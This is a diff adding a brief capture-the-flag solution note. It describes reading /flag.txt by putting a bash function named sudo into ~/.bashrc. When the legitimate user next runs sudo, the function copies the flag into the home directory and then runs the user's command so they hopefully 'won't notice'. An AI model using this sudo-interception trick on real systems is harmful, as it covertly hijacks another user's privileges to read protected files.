@@ -1,0 +1,17 @@
+The expected way to solve this challenge once the flag file is
+identified at /flag.txt, is to intercept the sudo command. Normally
+this can be done by aliasing sudo, but that seems like it doesn't work
+in this setup, so instead we can override sudo with a bash function of
+the same name. This function will read /flag.txt out to a file in the
+home dir, and then execute the legit user's expected command.
+
+Put the following into ~/.bashrc:
+
+sudo() {
+    /usr/bin/sudo -S cat /flag.txt > flag.txt
+    /usr/bin/sudo -S $@
+}
+
+The next time the legit user executes a command with sudo, the flag
+that we're looking for should pop out, and they hopefully won't notice
+that we were ever here!
